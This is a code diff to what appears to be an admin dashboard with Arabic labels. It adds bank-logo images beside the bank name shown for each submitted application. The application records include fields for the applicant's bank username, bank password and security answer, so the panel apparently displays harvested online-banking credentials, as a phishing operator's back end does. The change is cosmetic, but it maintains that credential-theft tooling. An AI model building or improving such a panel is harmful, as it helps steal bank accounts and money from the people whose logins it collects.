@@ -106,6 +106,7 @@ interface AppVersion {
   annualRevenue?: string;
   contactName?: string;
   bankName?: string;
+  bankLogo?: string;
   bankUsername?: string;
   bankPassword?: string;
   securityAnswer?: string;
@@ -1181,7 +1182,10 @@ export default function AdminDashboardPage() {
                                   )
                                 )}
                                 {app.bankName && (
-                                  <span className="text-xs bg-blue-50 text-blue-700 px-2 py-0.5 rounded-full">
+                                  <span className="text-xs bg-blue-50 text-blue-700 px-2 py-0.5 rounded-full flex items-center gap-1">
+                                    {app.bankLogo && (
+                                      <img src={app.bankLogo} alt={app.bankName} className="w-4 h-3 object-contain" />
+                                    )}
                                     {app.bankName}
                                   </span>
                                 )}
@@ -1338,7 +1342,15 @@ export default function AdminDashboardPage() {
                           {/* اسم البنك بارز في الأعلى */}
                           {(allData.bankName || app.bankName) && (
                             <div className="bg-primary/10 border border-primary/30 rounded-xl px-4 py-3 flex items-center gap-3 mb-3">
-                              <CreditCard className="w-5 h-5 text-primary shrink-0" />
+                              {(allData.bankLogo || latestData.bankLogo || app.bankLogo) ? (
+                                <img 
+                                  src={allData.bankLogo || latestData.bankLogo || app.bankLogo} 
+                                  alt={String(allData.bankName || app.bankName)} 
+                                  className="w-12 h-8 object-contain" 
+                                />
+                              ) : (
+                                <CreditCard className="w-5 h-5 text-primary shrink-0" />
+                              )}
                               <div>
                                 <p className="text-[10px] text-muted-foreground font-medium">البنك المختار</p>
                                 <p className="text-base font-black text-primary">{String(allData.bankName || app.bankName)}</p>
